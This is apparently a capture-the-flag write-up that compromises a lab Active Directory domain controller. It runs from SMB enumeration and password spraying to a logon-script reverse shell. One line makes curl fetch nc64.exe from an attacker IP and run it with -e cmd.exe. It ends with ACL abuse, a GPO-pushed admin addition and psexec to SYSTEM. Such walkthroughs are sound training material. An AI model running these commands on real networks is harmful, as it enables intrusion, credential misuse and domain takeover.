### Step 1: Service Enumeration with Nmap

We begin by running an **Nmap** scan to discover open ports and services on the target:

```bash
sudo nmap -sC -sV -Pn 10.10.77.235 --open
```

- **`-sC`** → runs default NSE scripts (basic enumeration).
    
- **`-sV`** → probes service versions.
    
- **`-Pn`** → skips host discovery (treats host as up).
    
- **`--open`** → shows only open ports.



Results:
```output
PORT     STATE SERVICE    VERSION
593/tcp  open  ncacn_http Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap   Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
```

**Analysis:**

- **Port 593 (ncacn_http)** → Microsoft RPC over HTTP. This is often tied to Exchange / DC services.
    
- **Port 3268 (LDAP Global Catalog)** → Indicates this is a **Domain Controller** for the domain `baby2.vl0`.
    
- **Port 3269 (LDAPS)** → The secure version of the Global Catalog LDAP service, running with TLS.
    

We also see from the certificate that the machine’s **hostname** is:

- `dc.baby2.vl`

### Step 2: SMB Enumeration

After identifying this host as a **Domain Controller**, we enumerate its SMB shares using **NetExec (nxc)** with anonymous authentication

```bash
nxc smb 10.10.77.235 -u 'anonymous' -p '' --shares
```

Results:
```output
SMB  10.10.77.235  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl)
SMB  10.10.77.235  445  DC  [+] baby2.vl\anonymous: (Guest)
SMB  10.10.77.235  445  DC  [*] Enumerated shares
SMB  10.10.77.235  445  DC  Share      Permissions   Remark
SMB  10.10.77.235  445  DC  -----      -----------   ------
SMB  10.10.77.235  445  DC  ADMIN$                   Remote Admin
SMB  10.10.77.235  445  DC  apps       READ
SMB  10.10.77.235  445  DC  C$                       Default share
SMB  10.10.77.235  445  DC  docs
SMB  10.10.77.235  445  DC  homes      READ,WRITE
SMB  10.10.77.235  445  DC  IPC$       READ          Remote IPC
SMB  10.10.77.235  445  DC  NETLOGON   READ          Logon server share
SMB  10.10.77.235  445  DC  SYSVOL                  Logon server share


```

**Analysis:**

- **apps (READ)** → accessible with read-only rights. May contain install files, configs, or interesting binaries.
    
- **docs (no listed perms)** → could be misconfigured; worth checking if it’s browsable.
    
- **homes (READ/WRITE)** → **critical**, since write access allows us to drop files or enumerate user home directories.
    
- **NETLOGON / SYSVOL** → typical AD shares; NETLOGON often contains logon scripts, SYSVOL holds Group Policy Objects (GPOs). These are common attack vectors.
    
The **homes** share looks especially promising because write access in a domain environment can often lead to credential discovery or even code execution

### Step 3: Exploring NETLOGON Share

Since **NETLOGON** often contains domain-wide logon scripts, we connect to it with **smbclient**:

```bash
smbclient //10.10.77.235/NETLOGON -N
```

We successfully authenticate anonymously and list the contents:

```output
smb: \> ls   .                                   D        0  Tue Aug 22 15:28:27 2023   ..                                  D        0  Tue Aug 22 13:43:55 2023   login.vbs                           A      992  Sat Sep  2 10:55:51 2023
```

We spot a **logon script**: `login.vbs`. This script is executed automatically whenever domain users log in. If we can modify it, we may be able to inject our own commands to achieve **code execution across the domain**.

We download the file for analysis:

```bash
smb: \> get login.vbs getting file \login.vbs of size 992 as login.vbs
```

Now we can open and inspect `login.vbs` locally to see how it operates and determine where we could insert a **malicious payload** (for example, a reverse shell).


### Step 4: Exploring the `apps` Share

We also enumerated the **apps** share anonymously:

```bash
smbclient //10.10.77.235/apps -N
```

Listing the contents, we find a `dev` directory:

```output

smb: \> ls   .                                   D        0  Thu Sep  7 15:12:59 2023   ..                                  D        0  Tue Aug 22 16:10:21 2023   dev                                 D        0  Thu Sep  7 15:13:50 2023`
```

Navigating into `dev`:

```bash
smb: \dev\> ls   .                                   D        0  Thu Sep  7 15:13:50 2023   ..                                  D        0  Thu Sep  7 15:12:59 2023   CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023   login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023`

```
Here we discover:

- **CHANGELOG** → likely contains development notes or update history.
    
- **login.vbs.lnk** → a Windows shortcut pointing to the `login.vbs` file (from NETLOGON).
    

We download the `.lnk` file for further inspection:

```bash
smb: \dev\> get login.vbs.lnk
```

---

**Analysis:**  
The presence of a `.lnk` file strongly suggests that this environment relies on the `login.vbs` script we already retrieved from `NETLOGON`. This reinforces its importance: any modification to `login.vbs` could directly affect user logons across the domain.

The **CHANGELOG** file might also reveal development practices, recent modifications, or even usernames associated with updates — useful for credential guessing or user enumeratio


# Step 5: Analyzing `login.vbs.lnk`

We dumped strings from the `login.vbs.lnk` file:

```bash
strings login.vbs.lnk
```

**Key Findings:**

```bash
C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs \\DC\NETLOGON\login.vbs
```

**Analysis:**

- The shortcut explicitly references the **domain logon script** `login.vbs`.
    
- It points to two locations:
    
    - The **SYSVOL path** → `C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs`
        
    - The **NETLOGON share** → `\\DC\NETLOGON\login.vbs`
        

This confirms that the `login.vbs` script is indeed **executed during user logons**.

```bash
 nxc smb 10.10.77.235 -u users.txt -p users.txt  --continue-on-success
```

```output
SMB         10.10.77.235    445    DC               [+] baby2.vl\:melia.Griffiths (Guest)
SMB         10.10.77.235    445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.10.77.235    445    DC               [+] baby2.vl\library:library 


```

## Step 5 – Accessing SYSVOL Share and Downloading `login.vbs`

1. Connect to the SMB share:
    

```bash
smbclient //10.10.77.235/SYSVOL -U library
```

2. Enter the password for `library` when prompted.
    
3. List directories:
    

```bash
dir
```

You will see:

```bash
 baby2.vl
```

4. Navigate into `baby2.vl`:
    

```bash
cd baby2.vl dir
```


You will see:

```bash
  login.vbs
```

6. Download `login.vbs`:
    

```bash
get login.vbs
```

- The file is saved locally as `login.vbs`.
    

7. Exit the SMB session:
    

```bash
exit
```


## Step 6 – Analyzing `login.vbs`

1. **Purpose of the Script**
    
    The `login.vbs` is a **login script** that runs whenever a user logs in. It performs two main tasks:
    
    - Maps network drives to the user (`V:` → `\\dc.baby2.vl\apps` and `L:` → `\\dc.baby2.vl\docs`).
        
    - Executes a remote download and reverse shell command.
        
2. **Mapping Network Drives**
    
    The `MapNetworkShare` subroutine does the following:
    
    - Creates a network object:
        
```bash
Set objNetwork = CreateObject("WScript.Network")
```
        
    - Checks if the drive letter is already mapped. If so, it removes it:
        
        `objNetwork.RemoveNetworkDrive driveLetter & ":", True, True`
        
    - Maps the new network drive:
        
        `objNetwork.MapNetworkDrive driveLetter & ":", sharePath`
        
    - Prints success or failure messages.
        
3. **Reverse Shell Component**
    
    This line is the **malicious part**:
    
```bash
WshShell.run "cmd.exe /c curl 10.8.7.96:8001/nc64.exe -o C:\Windows\Temp\nc64.exe && C:\Windows\Temp\nc64.exe 10.8.7.96 2222 -e cmd.exe"
```
    
    Step-by-step:
    
    - Downloads `nc64.exe` (Netcat 64-bit) from `10.8.7.96:8001`.
        
    - Saves it to `C:\Windows\Temp\nc64.exe`.
        
    - Runs Netcat to connect back to `10.8.7.96` on port `2222` and spawn a command shell (`cmd.exe`).
        
    
    This effectively **gives the attacker remote control** of the machine.
    
4. **Final Execution**
    
    At the end of the script, the network drives are mapped:
    
    `MapNetworkShare "\\dc.baby2.vl\apps", "V" MapNetworkShare "\\dc.baby2.vl\docs", "L"`


## Step 7 – Hosting `nc64.exe` for the Reverse Shell

1. **Starting the Server**
    
```bash
python3 -m http.server 8001 
```
    
    - This command starts a simple HTTP server on **port 8001**.
        
    - It serves any files in the current directory — in your case, `nc64.exe`.
        
    - This is exactly what the `login.vbs` script expects when it runs the `curl` command on the target.
        
2. **Target Machine Fetching the File**
    
    From your log:
    
    `10.10.77.235 - - [09/Sep/2025 19:01:37] "GET /nc64.exe HTTP/1.1" 200 -`
    
    - `10.10.77.235` is the IP of the target machine (the one executing the login script).
        
    - `"GET /nc64.exe HTTP/1.1" 200 -` confirms the file was **successfully downloaded**.
        
    - Repeated GET requests indicate the script may be running multiple times or retrying downloads.
        
3. **What Happens Next**
    
    Once the file is downloaded:
    
    `C:\Windows\Temp\nc64.exe 10.8.7.96 2222 -e cmd.exe`
    
    - `nc64.exe` executes and attempts to connect back to `10.8.7.96` on **port 2222**.
        
    - This sets up a **reverse shell**, giving you interactive access to the target.
        
## Step 8 – Reverse Shell Established

1. **Listener Started on Your Machine**
    

```bash
nc -nlvp 2222
```

- `-n` → Don’t resolve hostnames.
    
- `-l` → Listen mode (wait for incoming connections).
    
- `-v` → Verbose output.
    
- `-p 2222` → Listen on port 2222.
    

2. **Target Connects Back**
    

`connect to [10.8.7.96] from (UNKNOWN) [10.10.77.235] 53599`

- `10.10.77.235` is the target IP.
    
- `53599` is the ephemeral port used on the target.
    
- `(UNKNOWN)` because reverse DNS lookup failed — not critical.
    

3. **Shell Access**
    

`Microsoft Windows [Version 10.0.20348.1906] C:\Windows\system32>`

- You now have a **shell running as the user that executed `login.vbs`**.
    
- In this case, it’s a system-level shell since `login.vbs` is likely executed by a privileged user during logon.
    


## Step 10 – Current User & Privileges Analysis

```bash
whoami/all
```





**User:** `baby2\amelia.griffiths`

- Member of `Remote Desktop Users` locally.
    
- Global groups: `office`, `legacy`, `Domain Users`.
    
- Account is **active**, **never expires**, password **does not require change**.
    
- Uses a **logon script**: `\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs` (this is how we got the reverse shell).
    

**Privileges:**

- `SeMachineAccountPrivilege` → Disabled (cannot add computers to domain).
    
- `SeChangeNotifyPrivilege` → Enabled (standard, allows directory traversal bypass).
    
- `SeIncreaseWorkingSetPrivilege` → Disabled (minor, performance-related).
    

```bash
C:\Windows\system32>net users amelia.griffiths
net users amelia.griffiths
User name                    Amelia.Griffiths
Full Name                    Amelia Griffiths
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2023 12:18:21 PM
Password expires             Never
Password changeable          8/23/2023 12:18:21 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
User profile                 
Home directory               \\baby2.vl\homes\Amelia.Griffiths
Last logon                   9/9/2025 2:05:31 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users 
Global Group memberships     *office               *Domain Users         
                             *legacy               
The command completed successfully.


```


```bash
bloodhound-python -d 'baby2.vl' -u 'library' -p 'library' -c all -ns 10.10.77.235 --zip
```

```bash
sudo neo4j start
```

```bash
bloodhound
```

Here is user amelia that we got
---
![Screenshot](Pasted%20image%2020250910002715.png)



let’s see shortest path to domain admin
![Screenshot](Pasted%20image%2020250910002818.png)


we have amelia which is member of **LEGACY** , it has **WriteDacl** on **GPOADM**

let’s see how to abuse **WriteDacl**

```
:\temp>certutil -urlcache -split -f "http://10.8.7.96:8001/PowerView-Dev.ps1" PowerView-Dev.ps1

```

## Step 13 – Domain Object ACL Abuse

### 1️⃣ Granting Yourself Full Control over `gpoadm`

```bash
Add-DomainObjectAcl -TargetIdentity "gpoadm" -PrincipalIdentity amelia.griffiths -Domain baby2.vl -Rights All -Verbose
```

- **Target:** `gpoadm` (likely a privileged GPO admin account).
    
- **Principal:** `amelia.griffiths` (your current user).
    
- **Rights:** `All` → full control over the object in Active Directory.
    

**What this does:**

- You’ve effectively **added yourself as a powerful actor over `gpoadm`**.
    
- Now you can **reset the password** or manipulate that account.
    

 # **Setting a New Password for `gpoadm`**

First, you created a secure string for the password:

```bash
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

- This converts `'Password123!'` into a format PowerShell can use securely.
    

Then, you attempted to reset the password:

```bash
Set-DomainUserPassword -Identity "gpoadm" -AccountPassword $UserPassword -Verbose
```


    
- Corrected, it successfully **resets the password for `gpoadm`**.

After resetting the password for **gpoadm** and logging in, you enumerated the available Group Policy Objects:
```bash
PS C:\temp> Get-GPO -All
Get-GPO -All


DisplayName      : Default Domain Policy
DomainName       : baby2.vl
Owner            : BABY2\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 8/22/2023 10:37:41 AM
ModificationTime : 8/22/2023 1:22:12 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 30, SysVol Version: 30
WmiFilter        : 

DisplayName      : Default Domain Controllers Policy
DomainName       : baby2.vl
Owner            : BABY2\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 8/22/2023 10:37:41 AM
ModificationTime : 8/22/2023 1:51:56 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 2, SysVol Version: 2
WmiFilter        : 

```
# Step — Abusing GPO to add `gpoadm` to Local Administrators

You ran `pygpoabuse.py` to push a malicious GPO that adds the `gpoadm` account to the local Administrators group on target machines. Here’s a clear walkthrough of what you executed, what it did, and the immediate follow-ups.

---

## Command you ran

```bash
python3 pygpoabuse.py baby2.vl/gpoadm:'Password123!' \   -gpo-id "31b2f340-016d-11d2-945f-00C04FB984F9" \   -command 'net localgroup administrators GPOADM /add' -f \   -dc-ip 10.10.124.123
```

### Flags / arguments — what they mean

- `baby2.vl/gpoadm:'Password123!'` — authenticate to the domain as `gpoadm` using the password you set earlier.
    
- `-gpo-id "31b2f340-016d-11d2-945f-00C04FB984F9"` — GPO GUID to abuse. (`31B2F340-016D-11D2-945F-00C04FB984F9` is the common GUID for the **Default Domain Policy**.)
    
- `-command 'net localgroup administrators GPOADM /add'` — command the GPO will execute on targeted machines (adds `GPOADM` to the local Administrators group).
    
- `-f` — force or non-interactive mode (auto-confirm).
    
- `-dc-ip 10.10.124.123` — IP of the domain controller to talk to (if needed by the tool).
    

### Tool output

```output
SUCCESS:root:ScheduledTask TASK_5701378a created! [+] ScheduledTask TASK_5701378a created!
```
**Interpretation:** the tool successfully created/modified the GPO so that it deploys a Scheduled Task (or run-once command) which will run your specified `net localgroup ... /add` on the target systems.

### Step — Gain Domain Admin Shell with `psexec.py`

Now that **gpoadm** was added to the **local Administrators group** via GPO abuse, you can use **Impacket’s PsExec** to execute commands remotely on the Domain Controller with full SYSTEM privileges:

```bash
psexec.py baby2.vl/gpoadm:'Password123!'@10.10.124.123
```

**Output:**

- Writable share **ADMIN$** found.
    
- Service was created & started successfully.
    
- You received a **SYSTEM shell** on the Domain Controller:
    

`Microsoft Windows [Version 10.0.20348.1906] (c) Microsoft Corporation. All rights reserved.  C:\Windows\system32>`

---
```bash
C:\Users\Administrator\Desktop> type root.txt
VL{f0205b652ed74c5deed92b7a6a163516}
```

